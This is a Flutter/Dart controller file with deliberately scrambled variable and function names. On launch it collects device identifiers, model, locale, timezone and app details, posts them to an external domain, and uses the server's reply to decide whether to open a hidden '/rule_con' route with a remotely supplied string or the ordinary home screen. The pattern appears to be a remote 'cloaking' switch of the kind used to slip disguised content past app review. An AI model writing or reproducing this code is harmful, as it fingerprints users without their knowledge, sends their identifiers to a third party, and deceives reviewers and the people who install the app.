import 'dart:convert';
import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

class PageLogic extends GetxController {

  var bipqfn = RxBool(false);
  var xamhun = RxBool(true);
  var agdjhv = RxString("");
  var kelton = RxBool(false);
  var hickle = RxBool(true);
  final ipoysalhbe = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    ebkop();
  }


  Future<void> ebkop() async {

    kelton.value = true;
    hickle.value = true;
    xamhun.value = false;

    ipoysalhbe.post("https://ply-ai.daynokong.today/mgbdqlwutkfh",data: await olsdufqrpb()).then((value) {
      var kpsj = value.data["kpsj"] as String;
      var kwmulgd = value.data["kwmulgd"] as bool;
      if (kwmulgd) {
        agdjhv.value = kpsj;
        horace();
      } else {
        friesen();
      }
    }).catchError((e) {
      xamhun.value = true;
      hickle.value = true;
      kelton.value = false;
    });
  }

  Future<Map<String, dynamic>> olsdufqrpb() async {
    final DeviceInfoPlugin vazwljc = DeviceInfoPlugin();
    PackageInfo uchqxid_lcxjiw = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var hlvtab = Platform.localeName;
    var lgdizo_XnLUf = currentTimeZone;

    var lgdizo_yXupclCf = uchqxid_lcxjiw.packageName;
    var lgdizo_mDsiV = uchqxid_lcxjiw.version;
    var lgdizo_twzKsRGS = uchqxid_lcxjiw.buildNumber;

    var lgdizo_Ooxf = uchqxid_lcxjiw.appName;
    var lgdizo_XuendU = "";
    var stewartCummings = "";
    var lgdizo_ShIxfsy = "";
    var joeyJerde = "";
    var eddieHartmann = "";
    var zellaLubowitz = "";
    var ernestinaDenesik = "";
    var kamrenSchmidt = "";
    var ryanLangosh = "";
    var maurineSchaden = "";
    var lgdizo_IjpxU  = "";


    var lgdizo_fEk = "";
    var lgdizo_fAKagWiz = false;

    if (GetPlatform.isAndroid) {
      lgdizo_fEk = "android";
      var olyjhbfvkn = await vazwljc.androidInfo;

      lgdizo_ShIxfsy = olyjhbfvkn.brand;

      lgdizo_XuendU  = olyjhbfvkn.model;
      lgdizo_IjpxU = olyjhbfvkn.id;

      lgdizo_fAKagWiz = olyjhbfvkn.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      lgdizo_fEk = "ios";
      var vjkutlrcz = await vazwljc.iosInfo;
      lgdizo_ShIxfsy = vjkutlrcz.name;
      lgdizo_XuendU = vjkutlrcz.model;

      lgdizo_IjpxU = vjkutlrcz.identifierForVendor ?? "";
      lgdizo_fAKagWiz  = vjkutlrcz.isPhysicalDevice;
    }
    var res = {
      "lgdizo_Ooxf": lgdizo_Ooxf,
      "lgdizo_twzKsRGS": lgdizo_twzKsRGS,
      "lgdizo_yXupclCf": lgdizo_yXupclCf,
      "lgdizo_XnLUf": lgdizo_XnLUf,
      "lgdizo_mDsiV": lgdizo_mDsiV,
      "lgdizo_ShIxfsy": lgdizo_ShIxfsy,
      "lgdizo_IjpxU": lgdizo_IjpxU,
      "eddieHartmann" : eddieHartmann,
      "lgdizo_XuendU": lgdizo_XuendU,
      "hlvtab": hlvtab,
      "lgdizo_fEk": lgdizo_fEk,
      "lgdizo_fAKagWiz": lgdizo_fAKagWiz,
      "joeyJerde" : joeyJerde,
      "zellaLubowitz" : zellaLubowitz,
      "stewartCummings" : stewartCummings,
      "ernestinaDenesik" : ernestinaDenesik,
      "kamrenSchmidt" : kamrenSchmidt,
      "ryanLangosh" : ryanLangosh,
      "maurineSchaden" : maurineSchaden,

    };
    return res;
  }

  Future<void> friesen() async {
    Get.offAllNamed("/home");
  }

  Future<void> horace() async {
    Get.offAllNamed("/rule_con");
  }


}
